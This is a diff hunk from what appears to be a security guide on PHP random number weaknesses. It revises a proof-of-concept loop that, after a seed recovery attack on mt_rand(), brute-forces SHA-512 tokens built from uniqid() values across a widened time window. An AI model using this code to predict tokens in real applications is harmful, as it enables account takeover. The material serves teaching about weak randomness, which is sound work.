@@ -324,18 +324,22 @@ Taking the above example, we can see that by combining a Seed Recovery Attack ag
     mt_srand($bruteForcedSeed);
     $prefix = mt_rand();
 
-    for ($i=0; $i < 1000000; $i++) {
-        /**
-         * Replicate uniqid() token generator in PHP
-         */
-        $guess = hash('sha512', sprintf('%s%8x%5x', $prefix, $httpDateSeconds, $i));
-        if ($token == $guess) {
-            echo PHP_EOL, 'Actual Token: ', $token, PHP_EOL,
-                'Brute Forced Token: ', $guess, PHP_EOL;
-            exit(0);
-        }
-        if (($i % 15000) == 0) {
-            echo '~';
+    /**
+     * Increment HTTP Date by a few seconds to offset the possibility of
+     * us crossing the second tick between uniqid() and time() calls.
+     */
+    for ($j=$httpDateSeconds; $j < $httpDateSeconds+2; $j++) { 
+        for ($i=0; $i < 1000000; $i++) {
+            /** Replicate uniqid() token generator in PHP */
+            $guess = hash('sha512', sprintf('%s%8x%5x', $prefix, $j, $i));
+            if ($token == $guess) {
+                echo PHP_EOL, 'Actual Token: ', $token, PHP_EOL,
+                    'Forced Token: ', $guess, PHP_EOL;
+                exit(0);
+            }
+            if (($i % 20000) == 0) {
+                echo '~';
+            }
         }
     }
 
